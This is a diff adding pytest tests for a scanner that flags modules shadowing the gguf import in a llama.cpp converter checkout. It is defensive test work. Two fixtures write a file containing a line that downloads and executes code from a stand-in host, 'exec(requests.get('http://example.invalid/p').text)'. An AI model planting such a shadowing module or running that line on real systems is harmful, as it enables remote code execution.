@@ -1504,6 +1504,89 @@ def test_a_package_directory_that_cannot_be_opened_at_all_is_still_reported(
         llama_cpp._scan_conversion_package(str(root))
 
 
+def test_a_root_module_that_shadows_a_converter_import_is_scanned(tmp_path, monkeypatch):
+    """The converter's own directory is sys.path[0] for the subprocess.
+
+    It is searched before the gguf-py entry the entrypoint inserts at index 1, so
+    a root-level gguf.py wins over gguf-py/gguf: verified outside this suite, a
+    root gguf.py imported in place of the real package. Scanning only the named
+    packages left it executing under a clean entrypoint and clean packages.
+    """
+    llama_cpp = _load("llama_cpp_shadow_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    gguf = root / "gguf-py" / "gguf"
+    gguf.mkdir(parents = True)
+    (gguf / "__init__.py").write_text("WHO = 'real'\n", encoding = "utf-8")
+    (root / "gguf.py").write_text(
+        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
+        encoding = "utf-8",
+    )
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_a_root_package_that_shadows_a_converter_import_is_scanned(tmp_path, monkeypatch):
+    """A root directory carrying __init__.py shadows the same way and its code
+    runs on import, unlike a namespace directory, which imports to nothing."""
+    llama_cpp = _load("llama_cpp_shadow_pkg_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    shadow = root / "gguf"
+    shadow.mkdir()
+    (shadow / "__init__.py").write_text(
+        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
+        encoding = "utf-8",
+    )
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_the_rest_of_the_checkout_is_not_walked(tmp_path, monkeypatch):
+    """The root is scanned without recursion on purpose.
+
+    llama.cpp's checkout is enormous and none of it is importable by itself, so
+    walking it would cross every budget on an ordinary install and refuse the
+    export. Only the root's own modules, and directories that really are
+    packages, are read.
+    """
+    llama_cpp = _load("llama_cpp_shadow_scope_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    for name in ("ggml", "examples", "tools"):
+        big = root / name / "deep" / "deeper"
+        big.mkdir(parents = True)
+        (big / "buried.py").write_text("VALUE = 1\n", encoding = "utf-8")
+
+    locations = llama_cpp._scanned_locations(str(root))
+    assert {label for label, _path, _recursive in locations} == {"conversion", "."}
+    # The flag itself, not just the label: this is what keeps the rest of the
+    # checkout out, and flipping it is invisible to a label assertion.
+    assert dict((label, recursive) for label, _path, recursive in locations)["."] is False
+
+    read = []
+    real_open = open
+
+    def watch(path, *args, **kwargs):
+        read.append(str(path))
+        return real_open(path, *args, **kwargs)
+
+    monkeypatch.setattr("builtins.open", watch)
+    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    llama_cpp._scan_conversion_package(str(root))
+
+    assert not [path for path in read if "buried.py" in path], (
+        "the scan descended into the rest of the checkout"
+    )
+
+
 def _package_root(tmp_path):
     root = tmp_path / "llama.cpp"
     conversion = root / "conversion"
@@ -1560,15 +1643,21 @@ def test_the_cache_key_covers_gguf_py_on_a_monolith_checkout_too(tmp_path):
     assert llama_cpp._conversion_sibling_info(str(root)) != before
 
 
-def test_a_checkout_with_neither_package_still_has_no_key(tmp_path):
-    """The other half: None has to keep meaning nothing is there."""
+def test_a_checkout_with_neither_package_keys_on_its_root(tmp_path):
+    """The other half: None means there is nothing on disk to look at at all.
+
+    A checkout with no conversion/ and no gguf-py still has the directory the
+    converter runs from, which is sys.path[0] for the subprocess and where a
+    shadowing module would be planted, so that has to be keyed.
+    """
     llama_cpp = _load("llama_cpp_no_package_probe", "unsloth_zoo/llama_cpp.py")
 
     root = tmp_path / "llama.cpp"
     root.mkdir()
     (root / "convert_hf_to_gguf.py").write_text("import gguf\n", encoding = "utf-8")
 
-    assert llama_cpp._conversion_sibling_info(str(root)) is None
+    assert llama_cpp._conversion_sibling_info(str(root)) is not None
+    assert llama_cpp._conversion_sibling_info(str(tmp_path / "absent")) is None
 
 
 def test_the_cache_key_covers_gguf_py(tmp_path):
